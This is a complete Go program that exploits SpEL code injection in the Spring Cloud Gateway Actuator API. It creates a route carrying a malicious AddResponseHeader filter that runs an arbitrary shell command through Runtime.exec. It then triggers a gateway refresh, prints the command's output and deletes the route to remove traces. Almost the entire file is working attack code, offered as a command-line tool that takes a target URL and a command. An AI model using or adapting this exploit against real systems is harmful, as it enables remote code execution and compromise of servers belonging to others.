package main
import (
	"os"
	"fmt"
	"time"
	"flag"
	"bytes"
	"strings"
	"net/http"
	"math/rand"
	"io/ioutil"
	"crypto/tls"
)

func error(err interface{}) {
    if err != nil{
        panic(err)
    }
}

func Between(str, starting, ending string) string {
    s := strings.Index(str, starting)
    if s < 0 {
        return ""
    }
    s += len(starting)
    e := strings.Index(str[s:], ending)
    if e < 0 {
        return ""
    }
    return str[s : s+e]
}

func conx(url, random, comando string){

	var payload string = `{"id": "` + random + `", "filters": [{"name": "AddResponseHeader", "args": {"name": "Result", "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(\"` + comando + `\").getInputStream()))}"}}], "uri": "http://example.com"}`
	var jsonStr = []byte(payload)
	url1 := url + "/actuator/gateway/routes/" + random
	url2 := url + "/actuator/gateway/refresh"

    req, err := http.NewRequest("POST", url1, bytes.NewBuffer(jsonStr))

    req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36")
    req.Header.Set("Content-Type", "application/json")
    req.Header.Set("Accept", "*/*")

    client := &http.Client{Transport: &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}}
    resp, err := client.Do(req)
    error(err)

    defer resp.Body.Close()

    body, err := ioutil.ReadAll(resp.Body)
    _ = body
    error(err)

    if resp.Status == "201 Created"{
    	fmt.Println(":: Connection successfully with the target.")
    	fmt.Println(":: Deployed stage at /actuator/gateway/routes/" + random)
    	fmt.Println(":: Triggering RCE ..")

    	req2, err := http.NewRequest("POST", url2, bytes.NewBuffer(nil))

    	req2.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36")
    	req2.Header.Set("Content-Type", "application/json")
    	req2.Header.Set("Accept", "*/*")

    	resp2, err := client.Do(req2)
    	error(err)

    	if resp2.Status == "200 OK"{

    		req3, err := http.Get(url1)
    		error(err)

    		body, err := ioutil.ReadAll(req3.Body)
    		error(err)

    		fmt.Println(":: Exploit completed.\n")
    		resultado_rce := Between(string(body),"= '",`\n']`)
    		ns := strings.Replace(resultado_rce, `\n`, "\n", -1)
    		fmt.Println(ns)

    		req4, err := http.NewRequest("DELETE", url1, nil)
    		//fmt.Println(url1)
    		error(err)

    		resp3, err := client.Do(req4)
    		_ = resp3
    		error(err)
    	}
    } else {
    	fmt.Println(":: Error in status code at /actuator/gateway/routes/" + random + " -> " + resp.Status)
    }
}

func main(){

	var url string
	var comando string

	flag.StringVar(&url, "u", "", "")
	flag.StringVar(&comando, "c", "", "")
	flag.CommandLine.Usage = func() { fmt.Println("\n./spring -u http://127.0.0.1:8080 -c id") }
	flag.Parse()

	if len(url) == 0 {

	url_vazia, err := os.OpenFile(url, os.O_RDWR, 0000)
	_ = url_vazia
	if err != nil {
		fmt.Println("[!] Specify an URL for the target connection.")
		return
	}
}
	if len(comando) == 0 {

	comando_vazio, err := os.OpenFile(comando, os.O_RDWR, 0000)
	_ = comando_vazio
	if err != nil {
		fmt.Println("[!] Specify a command for the execution.")
		return
	}
}
	rand.Seed(time.Now().Unix())

    charSet := "abcdefghijklmnopqrstuvwxyz"
    var output strings.Builder
    length := 10
    for i := 0; i < length; i++ {
        random := rand.Intn(len(charSet))
        randomChar := charSet[random]
        output.WriteString(string(randomChar))
    }
    aleatorio := output.String()
    output.Reset()

	newVal := url[len(url)-1:]
	fmt.Println("\n>> Spring Cloud Gateway Actuator API SpEL Code Injection.\n")
	if newVal == "/"{
		url_sem_barra_1 := strings.TrimSuffix(url, "/")
		conx(url_sem_barra_1, aleatorio, comando)
	} else if newVal != "/" {
		conx(url, aleatorio, comando)
	}
}